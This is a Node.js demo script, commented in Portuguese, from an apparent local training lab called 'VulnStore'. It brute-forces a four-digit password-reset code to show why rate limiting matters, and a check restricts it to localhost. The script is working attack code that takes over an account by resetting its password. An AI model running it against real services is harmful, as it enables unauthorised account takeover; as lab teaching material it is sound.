/**
 * Demo de falta de Rate Limiting: força bruta no código de recuperação de senha.
 * Uso:  node scripts/brute-otp.js [baseUrl] [email]
 *   ex: node scripts/brute-otp.js http://127.0.0.1:3000 ana@vulnstore.test
 *
 * Somente para o laboratório local da VulnStore.
 */
const base = process.argv[2] || 'http://127.0.0.1:3000';
const email = process.argv[3] || 'ana@vulnstore.test';
const NEW_PASSWORD = 'hackeada123';
const CONCURRENCY = 50;

if (!/^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?$/.test(base)) {
  console.error('Este script só roda contra o laboratório local (127.0.0.1/localhost).');
  process.exit(1);
}

const post = (path, body) => fetch(base + path, {
  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
}).then(async (r) => ({ status: r.status, body: await r.json() }));

(async () => {
  console.log(`[*] Solicitando código de recuperação para ${email}...`);
  console.log('   ', (await post('/api/auth/forgot-password', { email })).body.message);

  const start = Date.now();
  let tries = 0, found = null, blocked = 0;
  const codes = Array.from({ length: 10000 }, (_, i) => String(i).padStart(4, '0'));

  for (let i = 0; i < codes.length && !found; i += CONCURRENCY) {
    const batch = codes.slice(i, i + CONCURRENCY);
    const results = await Promise.all(batch.map((code) =>
      post('/api/auth/reset-password', { email, code, newPassword: NEW_PASSWORD }).then((r) => ({ code, ...r }))));
    for (const r of results) {
      tries++;
      if (r.status === 429) blocked++;
      if (r.status === 200) found = r.code;
    }
    if (blocked > 0) { console.log(`[!] Recebi HTTP 429 (rate limit) após ${tries} tentativas. Ataque bloqueado.`); break; }
    if (tries % 1000 === 0) process.stdout.write(`    ${tries} tentativas...\n`);
  }

  const secs = ((Date.now() - start) / 1000).toFixed(1);
  if (found) {
    console.log(`[+] Código encontrado: ${found} em ${tries} tentativas (${secs}s).`);
    console.log(`[+] Senha de ${email} alterada para "${NEW_PASSWORD}". Teste o login!`);
  } else {
    console.log(`[-] Código não encontrado (${tries} tentativas, ${secs}s).`);
  }
})();
